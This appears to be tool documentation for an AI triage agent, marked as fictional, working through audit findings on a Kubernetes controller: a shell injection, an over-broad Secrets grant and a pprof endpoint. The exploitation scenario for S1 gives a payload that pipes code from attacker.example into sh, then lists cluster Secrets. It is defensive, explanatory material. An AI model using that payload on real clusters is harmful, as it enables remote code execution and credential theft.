# Example: triage after a full audit

> Continues [the full audit example](audit-controller-scan.md). The controller,
> its advisory history and every answer are fictional. Scores are illustrative.

**Trigger:** the audit's closing question.

---

```
3 open findings (1 vulnerability, 2 hardening), 2 with Medium/High break risk
that need runtime verification. Want me to run `/ponytail-sec-triage` on them?
`all`, pick by number (e.g. `S1`), or `no`.
```

**User:** `all`

```
Scan: audit-20260911-143022-Xk9mQ2 (findings_sha256 OK)
  S1 · vulnerability · Job name injected into shell command allows command execution · triaged no
  S2 · hardening · Controller ServiceAccount granted wildcard access to all Secrets · triaged no
  S3 · hardening · pprof debug endpoint enabled unconditionally in controller · triaged no

Context found in the repo:
  SECURITY.md
  docs/security/threat-model.md
  charts/controller/values.yaml, deploy/rbac.yaml, deploy/crds/

Published advisories (gh api …/security-advisories?state=published): 1 candidate
  GHSA-0000-0000-0000  Shell injection through job name in API handler
                       ⚠️ fictional, for this example only

Before I triage, anything that would help me decide?
  [q] Answer up to 5 questions about these findings
  [t] Free text: paste links, notes, a previous advisory, a past issue/PR
  [s] Skip: use only the repo
```

**User:** `q`

| # | Question | User's answer |
|---|---|---|
| 1 | Who can set `spec.jobName`: only the HTTP API, or anyone who can create a `Job` object? (S1, Attack Vector / Privileges Required) | Any namespace with create on jobs.example.dev can set spec.jobName. The API itself is cluster-internal. |
| 2 | Has this been reported before? GHSA-0000-0000-0000 looks close. Is it the same code path, and is its payload public? (S1, Exploit Maturity) | Same RunJob sink as GHSA-0000-0000-0000; its payload is public. We only fixed the API handler. |
| 3 | How sensitive is the data in the controller's namespace? (S1, Confidentiality Requirement) | See docs/security/threat-model.md, tenant kubeconfigs live in the controller namespace. |
| 4 | Does anything besides the controller run as its ServiceAccount? (S2, Break-risk) | Not sure anything else uses the controller ServiceAccount. Maybe the cleanup hook. *(also: "Use the kind-dev cluster for kubectl checks.")* |
| 5 | Which binary do production images ship? (S3, Affected) | Production images are built from build/Dockerfile.release, which compiles ./cmd/controller-lite. internal/cmd/controller is only the dev binary used by make dev. |

**User**, after the questions: Write a PoC for S1, I'll approve running it.

Step 0 answered every per-finding question, so there are none left to ask. The
main agent builds one evidence bundle per finding (the `findings.json` entry,
the code with its callers and callees, the context above, that finding's
answers) and runs a fresh, read-only `ponytail-sec-triage` agent on each. The
agents never see the audit's narrative or its "if I were you" ranking. They
return draft reports and the evidence they need; the main agent writes the PoC
and runs the `go test`, `grep` and `kubectl` commands after the user approves
them, then sends the outputs back.

---

## S1: vulnerability, rescored

`.ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/S1.triage.md`:

````markdown
---
id: S1
title: Job name injected into shell command allows command execution
source: audit-20260911-143022-Xk9mQ2
class: vulnerability
severity: High
cvss: CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:H
cvss_score: 7.3
cvss_score_audit: 8.1
cvss_nomenclature: CVSS-BTE
stage: 3 · Exec
location: internal/exec/manager.go:34
tags: [inject]
break_risk: Medium
fingerprint: example/controller:internal/exec/manager.go:RunJob:os-command-injection
vex_status: affected
evidence: [S1/go-test.txt]
context:
  - "repo: docs/security/threat-model.md"
  - "repo: deploy/crds/jobs.example.dev.yaml"
  - "advisory: GHSA-0000-0000-0000 (fictional, for this example only)"
  - "user: Who can set spec.jobName? → Any namespace with create on jobs.example.dev can set spec.jobName. The API itself is cluster-internal."
  - "user: Is GHSA-0000-0000-0000 the same code path, with a public payload? → Same RunJob sink as GHSA-0000-0000-0000; its payload is public. We only fixed the API handler."
  - "user: How sensitive is the data in the controller namespace? → See docs/security/threat-model.md, tenant kubeconfigs live in the controller namespace."
---

# S1 · Job name injected into shell command allows command execution

> **Verdict:** Affected. A unit-test PoC runs a shell command through `spec.jobName`.
> **Rating:** Severity: High (CVSS-BTE 7.3; audit CVSS-B 8.1)
> **Priority:** Fix this sprint. It is the only live execution path in the scan and the fix is one line.
> ⚠️ Verification pending: break risk Medium, run the job e2e suite after the fix.

## 1. Summary

`RunJob` builds a `sh -c` string from `spec.jobName` on the `Job` custom
resource. Any tenant allowed to create a `Job` gets command execution in the
controller pod. The earlier fix for the same sink validates names in the API
handler only; the reconciler path never passes through it.

## 2. Affected

| | |
|---|---|
| Component | controller job runner (`internal/exec`) |
| Location | `internal/exec/manager.go:34`, `RunJob` |
| Commit | `d87f7c533703072a304dda39a8f975bc6fab2d39` (audited) |
| Versions | `v0.9.0` to `v0.11.2`: the reconciler started calling `RunJob` in `v0.9.0` (`git log -L '/func RunJob/,+20:internal/exec/manager.go'`) |

## 3. Description

```go
// internal/exec/manager.go:34
cmd := exec.Command("sh", "-c", "run-job "+job.Spec.JobName)
```

Callers: `internal/api/jobs.go:61` (HTTP handler) and
`internal/controller/reconcile.go:112` (reconciler).

Mitigations checked:

- **Name validation.** `internal/api/jobs.go:58` rejects names outside
  `^[a-z0-9-]+$`. This was the fix for GHSA-0000-0000-0000, but it covers the HTTP
  handler only.
- **CRD schema.** `spec.jobName` in `deploy/crds/jobs.example.dev.yaml` is a
  plain `string` with no `pattern`, so the API server accepts any value.
- **Shell use.** `RunJob` is the only `sh -c` call in the repo (`grep -rn '"sh", "-c"' --include='*.go'`).

The OWASP OS Command Injection Defense Cheat Sheet's primary defence is to
avoid the shell entirely. The handler's allowlist is its secondary defence,
and it is missing on the reconciler path.

## 4. Rating

Scored in isolation. The `S2` grant is not credited here (see §5 and §7).

| Group | Metric | Audit (CVSS-B) | Triage | Justification | Source |
|---|---|---|---|---|---|
| Base | AV | A | A | Job objects reach the controller through the cluster API, not from outside | user answer; `deploy/crds/jobs.example.dev.yaml` |
| Base | AC | L | L | No race or secret to guess; the PoC works on the first run | `S1/go-test.txt` |
| Base | AT | N | N | No deployment precondition; the reconciler runs on every Job | `internal/controller/reconcile.go:112` |
| Base | PR | L | L | Needs `create` on `jobs.example.dev` in any namespace | user answer |
| Base | UI | N | N | No user action needed | code read |
| Base | VC | H | H | Shell in the controller pod reads everything it can read | code read |
| Base | VI | H | H | Can rewrite job state and the controller's status writes | code read |
| Base | VA | H | H | Can kill the controller process | code read |
| Base | SC | N | N | Reaching other systems needs the `S2` grant, which is a separate finding | §5 |
| Base | SI | N | N | Same as SC | §5 |
| Base | SA | N | N | Same as SC | §5 |
| Threat | E | X (not set) | P | The published advisory's payload works unchanged against the reconciler path | GHSA-0000-0000-0000 (fictional); user answer |
| Environmental | CR | X (not set) | H | Tenant kubeconfigs live in the controller namespace | `docs/security/threat-model.md` |
| Environmental | IR, AR | X (not set) | X (not set) | No source | |
| Environmental | MAV … MSA | X (not set) | X (not set) | No source | |

`CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:H`
→ **7.3, High (CVSS-BTE)**. No CVSS 4.0 calculator on PATH; check it here:
<https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:H>

## 5. Impact

On its own: arbitrary commands as the controller's user, inside its pod. That
is enough to read and change every Job the controller manages, and to stop it.

Chained: the controller's ServiceAccount holds `secrets: ["*"]` (`S2`), so the
mounted token lists every Secret in the cluster, including the tenant
kubeconfigs `docs/security/threat-model.md` rates as high confidentiality.
That chain is why `S1` and `S2` should be fixed together. It is not added to
the score.

## 6. Reproduction / Verification

Static:

```bash
grep -n '"sh", "-c"' internal/exec/manager.go
```

PoC (run; output in `S1/go-test.txt`), written because the user asked for one.
The test fails while the bug exists and passes once it is fixed, so it doubles
as the regression test:

```bash
cp .ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/S1/poc/runjob_poc_test.go internal/exec/
go test ./internal/exec -run TestRunJobShellInjection -v
rm internal/exec/runjob_poc_test.go
```

```
=== RUN   TestRunJobShellInjection
    runjob_poc_test.go:16: job name executed as shell: /tmp/TestRunJobShellInjection1234/001/pwned exists
--- FAIL: TestRunJobShellInjection (0.01s)
```

Payload shape from OWASP WSTG-INPV-12 (command chaining with `;`).

Still to run, after the fix (runtime):

```bash
make e2e E2E_FOCUS=jobs
kubectl -n tenant-a apply -f test/e2e/testdata/job-with-spaces.yaml
kubectl -n controller-system logs deploy/controller | grep -i 'run-job'
```

## 7. Exploitation scenario

A tenant with `create` on `jobs.example.dev` in their own namespace applies a
Job with `spec.jobName: "x; curl -s http://attacker.example/s | sh"`. The
reconciler picks it up and runs the payload in the controller pod. With the
`S2` grant still in place, the next step is
`kubectl get secrets -A` with the mounted token.

## 8. Remediation

Proposed only, not applied. Smallest fix: drop the shell.

```diff
-	cmd := exec.Command("sh", "-c", "run-job "+job.Spec.JobName)
+	cmd := exec.Command("run-job", "--", job.Spec.JobName)
```

Break risk Medium: if any caller relies on shell word splitting (names with
spaces as several arguments), it changes behaviour. That is what the
`job-with-spaces` check in §6 is for.

Apply it with `/ponytail`, then re-check the diff with `/ponytail-sec`. The
PoC test should pass afterwards.

This is released code (`v0.9.0` onward). Consider opening a GitHub Security
Advisory for it. No CVE ID is assigned here.

## 9. References

- FIRST, CVSS v4.0 Specification: Exploit Maturity (E) and Confidentiality Requirement (CR). <https://www.first.org/cvss/v4.0/specification-document>
- OWASP OS Command Injection Defense Cheat Sheet. <https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html>
- OWASP WSTG-INPV-12, Testing for Command Injection. <https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection>
- GHSA-0000-0000-0000 (fictional, for this example only).
- `docs/security/threat-model.md`

## Appendix: triage notes

- **Context used:** `docs/security/threat-model.md`, `deploy/crds/jobs.example.dev.yaml`, three step 0 answers, one published advisory.
- **History (location + title):** GHSA-0000-0000-0000 (fictional) has the same
  `RunJob` sink and fixed the API handler in `v0.8.1`; this is the reconciler
  path it missed. `audit-20260902-091455-a7Kd2p` reported the same location
  and title as `S1`, with no triage report.
- **Agent:** `ponytail-sec-triage` subagent, given the finding, `RunJob`'s
  callers and callees, the context above, and the user's answers.
````

`triage/S1/poc/runjob_poc_test.go`:

```go
package exec

import (
	"os"
	"path/filepath"
	"testing"
)

// PoC for S1: a job name must never reach a shell.
// Fails while vulnerable; passes once RunJob drops sh -c.
func TestRunJobShellInjection(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "pwned")
	m := NewManager()
	_ = m.RunJob(Job{Spec: JobSpec{JobName: "x; touch " + marker}})
	if _, err := os.Stat(marker); err == nil {
		t.Fatalf("job name executed as shell: %s exists", marker)
	}
}
```

## S2: hardening, verification pending

`.ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/S2.triage.md`:

````markdown
---
id: S2
title: Controller ServiceAccount granted wildcard access to all Secrets
source: audit-20260911-143022-Xk9mQ2
class: hardening
efficacy: High
cwe: CWE-269
stage: 2 · Authz
location: deploy/rbac.yaml:30
tags: [rbac]
break_risk: High
fingerprint: example/controller:deploy/rbac.yaml:ClusterRole/controller:excessive-secrets-access
vex_status: affected
evidence: [S2/auth-can-i.txt, S2/grep-secrets.txt]
context:
  - "repo: deploy/rbac.yaml"
  - "repo: charts/controller/templates/cleanup-hook.yaml"
  - "user: Does anything besides the controller run as its ServiceAccount? → Not sure anything else uses the controller ServiceAccount. Maybe the cleanup hook."
  - "user: free text → Use the kind-dev cluster for kubectl checks."
---

# S2 · Controller ServiceAccount granted wildcard access to all Secrets

> **Verdict:** Affected. The grant is live on `kind-dev` and no controller code reads Secrets.
> **Rating:** Efficacy: High · CWE-269
> **Priority:** Next sprint, right after `S1`. Prove the removal on a deployed cluster before merging.
> ⚠️ Verification pending: break risk High, the chart's cleanup hook borrows this ServiceAccount.

## 1. Summary

The controller's ClusterRole grants every verb on every Secret in the
cluster. No Go code in the controller reads Secrets. Removing the grant takes
cluster-wide secret access away from anyone who gets code execution in the
controller. One consumer outside the controller code needs checking first:
the Helm cleanup hook runs as the same ServiceAccount.

## 2. Affected

| | |
|---|---|
| Component | controller RBAC (`deploy/rbac.yaml`, rendered by `charts/controller`) |
| Location | `deploy/rbac.yaml:30`, ClusterRole `controller` |
| Commit | `d87f7c533703072a304dda39a8f975bc6fab2d39` (audited) |
| Versions | every release that ships `deploy/rbac.yaml` (`git log --follow deploy/rbac.yaml`) |

## 3. Description

```yaml
# deploy/rbac.yaml:30
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["*"]
```

Mitigations checked:

- **Code use.** No `corev1.Secret`, `Secrets(` or Secret informer anywhere in
  the Go code (`S2/grep-secrets.txt`).
- **Out-of-band consumers.** `charts/controller/templates/cleanup-hook.yaml`
  is a `pre-delete` hook that runs as the controller ServiceAccount and runs
  `kubectl delete secret -l app.kubernetes.io/managed-by=controller`. That
  needs `list` and `delete` on Secrets in the release namespace. It does not
  need `*` across the cluster.
- **Namespace scope.** The grant is in a ClusterRole bound with a
  ClusterRoleBinding, so it covers every namespace.

This matches the documented behaviour, so it stays hardening: nothing in the
docs promises the controller is restricted from Secrets. OWASP ASVS 4.0.3
V4.1.3 (least privilege) confirms it is a gap.

## 4. Rating

**Efficacy: High · CWE-269 (Improper Privilege Management).**

One rule removed (plus a namespaced Role if the hook needs it) closes
cluster-wide Secret access for every install. It turns any future code
execution in the controller, `S1` included, from cluster-wide secret theft into
damage inside one pod. Nothing else in the stack compensates: there is no
admission policy or audit alert on Secret reads in `deploy/` or the chart.
That is why it is High, not Medium.

Hardening findings carry no CVSS score.

## 5. Impact

Today, anything that runs as the controller ServiceAccount can read, change
or delete any Secret in the cluster: tenant kubeconfigs, registry
credentials, TLS keys. On its own the grant is not exploitable; it sets how
far a compromise of the controller reaches. Chained with `S1`, a tenant gets
there in one Job object.

## 6. Reproduction / Verification

Run against `kind-dev`, as the user suggested (output in `S2/auth-can-i.txt`):

```bash
kubectl --context kind-dev auth can-i --list \
  --as=system:serviceaccount:controller-system:controller | grep -E '^secrets'
```

```
secrets    []    []    [*]
```

Static (output in `S2/grep-secrets.txt`):

```bash
grep -rnE 'corev1\.Secret|\.Secrets\(|Informer.*Secret' --include='*.go' .
grep -rn 'secret' charts/controller/templates/
```

The first finds nothing. The second finds the cleanup hook's
`kubectl delete secret` line and its `serviceAccountName`.

Still to run, after the fix (runtime):

```bash
helm --kube-context kind-dev upgrade --install controller charts/controller
make e2e
helm --kube-context kind-dev uninstall controller   # fires the pre-delete hook
kubectl --context kind-dev get events -A --field-selector reason=Failed | grep -i forbidden
```

The fix is good when e2e passes, the hook completes, and no `forbidden`
events appear.

## 7. Exploitation scenario

The attack the fix makes harder: an attacker who gets code execution in the
controller pod (through `S1`, a dependency bug, or a compromised image) reads
the mounted token and runs `kubectl get secrets -A -o yaml`. With the grant
gone, that call returns `forbidden`. They are left with the controller's own
objects and lose the keys to every tenant.

## 8. Remediation

Proposed only, not applied. Smallest fix: drop the rule. If the hook check in
§6 shows it still needs access, give it back only what it uses, scoped to the
release namespace.

```diff
 # deploy/rbac.yaml
-- apiGroups: [""]
-  resources: ["secrets"]
-  verbs: ["*"]
```

```yaml
# only if the cleanup hook needs it: a Role, not a ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: controller-cleanup
  namespace: controller-system
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["list", "delete"]
```

Break risk High: something outside the reviewed files may still use the
grant. If the runtime check in §6 breaks, ask for a narrower angle rather than
restoring `*`.

Apply it with `/ponytail`, then re-check the diff with `/ponytail-sec`.

## 9. References

- CWE-269, Improper Privilege Management. <https://cwe.mitre.org/data/definitions/269.html>
- OWASP ASVS 4.0.3, V4.1.3. <https://github.com/OWASP/ASVS/blob/v4.0.3/4.0/en/0x12-V4-Access-Control.md>
- OWASP Kubernetes Security Cheat Sheet, RBAC least privilege. <https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html>
- `charts/controller/templates/cleanup-hook.yaml`

## Appendix: triage notes

- **Context used:** `deploy/rbac.yaml`, `charts/controller/templates/cleanup-hook.yaml`, two step 0 answers, `kubectl` against `kind-dev`.
- **History (location + title):** `audit-20260902-091455-a7Kd2p` reported the
  same location and title, with no triage report. No advisory matches.
- **Agent:** `ponytail-sec-triage` subagent.
````

Every evidence file records the command that produced it.
`triage/S2/auth-can-i.txt`:

```
$ kubectl --context kind-dev auth can-i --list --as=system:serviceaccount:controller-system:controller | grep -E '^secrets'
secrets    []    []    [*]
exit=0
```

## S3: not affected, from a user answer

The answer to question 5 is a claim, so the agent asked for a check, which
the main agent ran:
`build/Dockerfile.release:12` builds `./cmd/controller-lite`, and
`go list -deps ./cmd/controller-lite | grep internal/cmd/controller` prints
nothing (saved as `triage/S3/go-list-deps.txt`). The user's answer plus the
Dockerfile line are the sources for `vulnerable_code_not_present`. The report
follows the same nine sections; its frontmatter and header:

````markdown
---
id: S3
title: pprof debug endpoint enabled unconditionally in controller
source: audit-20260911-143022-Xk9mQ2
class: hardening
efficacy: Low
cwe: CWE-1188
stage: 4 · Data
location: internal/cmd/controller/root.go:147
tags: [expose]
break_risk: Low
fingerprint: example/controller:internal/cmd/controller/root.go:Run:ungated-debug-endpoint
vex_status: not_affected
vex_justification: vulnerable_code_not_present
evidence: [S3/go-list-deps.txt]
context:
  - "user: Which binary do production images ship? → Production images are built from build/Dockerfile.release, which compiles ./cmd/controller-lite. internal/cmd/controller is only the dev binary used by make dev."
  - "repo: build/Dockerfile.release:12"
---

# S3 · pprof debug endpoint enabled unconditionally in controller

> **Verdict:** Not affected. The shipped image does not contain this code (`vulnerable_code_not_present`).
> **Rating:** Efficacy: Low · CWE-1188 (audit: Medium)
> **Priority:** Optional. Gate it for dev builds when you next touch the file.
````

---

## Check, index, summary

```
$ check-triage.sh
OK: 3 triage report(s) valid
$ build-index.sh
Wrote .ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/index.json
$ shell-summary.sh
S1  Vulnerability  Severity: High CVSS-B 8.1 → 7.3 (CVSS-BTE)     affected · evidence: 1  fix: proposed (break-risk Medium)
S2  Hardening      Efficacy: High CWE-269                         affected · evidence: 2  fix: proposed (break-risk High)
S3  Hardening      Efficacy: Low CWE-1188                         not_affected · evidence: 1  fix: not needed
```

```
Triage saved:
  .ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/S1.triage.md
  .ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/S2.triage.md
  .ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/S3.triage.md
  .ponytail-sec/audit-20260911-143022-Xk9mQ2/triage/index.json
```

`findings.json` and `meta.json` are unchanged.

```
⚠️ S1 is an affected vulnerability in released code (v0.9.0 onward). Do not
commit anything in triage/, or open public issues or PRs from it, until the
GitHub Security Advisory is published.
```

```json name=index.json
{
  "source": "audit-20260911-143022-Xk9mQ2",
  "findings": [
    {
      "id": "S1",
      "title": "Job name injected into shell command allows command execution",
      "source": "audit-20260911-143022-Xk9mQ2",
      "class": "vulnerability",
      "severity": "High",
      "cvss": "CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P/CR:H",
      "cvss_score": 7.3,
      "cvss_score_audit": 8.1,
      "cvss_nomenclature": "CVSS-BTE",
      "stage": "3 · Exec",
      "location": "internal/exec/manager.go:34",
      "tags": [
        "inject"
      ],
      "break_risk": "Medium",
      "fingerprint": "example/controller:internal/exec/manager.go:RunJob:os-command-injection",
      "vex_status": "affected",
      "evidence": [
        "S1/go-test.txt"
      ],
      "context": [
        "repo: docs/security/threat-model.md",
        "repo: deploy/crds/jobs.example.dev.yaml",
        "advisory: GHSA-0000-0000-0000 (fictional, for this example only)",
        "user: Who can set spec.jobName? → Any namespace with create on jobs.example.dev can set spec.jobName. The API itself is cluster-internal.",
        "user: Is GHSA-0000-0000-0000 the same code path, with a public payload? → Same RunJob sink as GHSA-0000-0000-0000; its payload is public. We only fixed the API handler.",
        "user: How sensitive is the data in the controller namespace? → See docs/security/threat-model.md, tenant kubeconfigs live in the controller namespace."
      ],
      "report": "S1.triage.md"
    },
    {
      "id": "S2",
      "title": "Controller ServiceAccount granted wildcard access to all Secrets",
      "source": "audit-20260911-143022-Xk9mQ2",
      "class": "hardening",
      "efficacy": "High",
      "cwe": "CWE-269",
      "stage": "2 · Authz",
      "location": "deploy/rbac.yaml:30",
      "tags": [
        "rbac"
      ],
      "break_risk": "High",
      "fingerprint": "example/controller:deploy/rbac.yaml:ClusterRole/controller:excessive-secrets-access",
      "vex_status": "affected",
      "evidence": [
        "S2/auth-can-i.txt",
        "S2/grep-secrets.txt"
      ],
      "context": [
        "repo: deploy/rbac.yaml",
        "repo: charts/controller/templates/cleanup-hook.yaml",
        "user: Does anything besides the controller run as its ServiceAccount? → Not sure anything else uses the controller ServiceAccount. Maybe the cleanup hook.",
        "user: free text → Use the kind-dev cluster for kubectl checks."
      ],
      "report": "S2.triage.md"
    },
    {
      "id": "S3",
      "title": "pprof debug endpoint enabled unconditionally in controller",
      "source": "audit-20260911-143022-Xk9mQ2",
      "class": "hardening",
      "efficacy": "Low",
      "cwe": "CWE-1188",
      "stage": "4 · Data",
      "location": "internal/cmd/controller/root.go:147",
      "tags": [
        "expose"
      ],
      "break_risk": "Low",
      "fingerprint": "example/controller:internal/cmd/controller/root.go:Run:ungated-debug-endpoint",
      "vex_status": "not_affected",
      "vex_justification": "vulnerable_code_not_present",
      "evidence": [
        "S3/go-list-deps.txt"
      ],
      "context": [
        "user: Which binary do production images ship? → Production images are built from build/Dockerfile.release, which compiles ./cmd/controller-lite. internal/cmd/controller is only the dev binary used by make dev.",
        "repo: build/Dockerfile.release:12"
      ],
      "report": "S3.triage.md"
    }
  ]
}
```
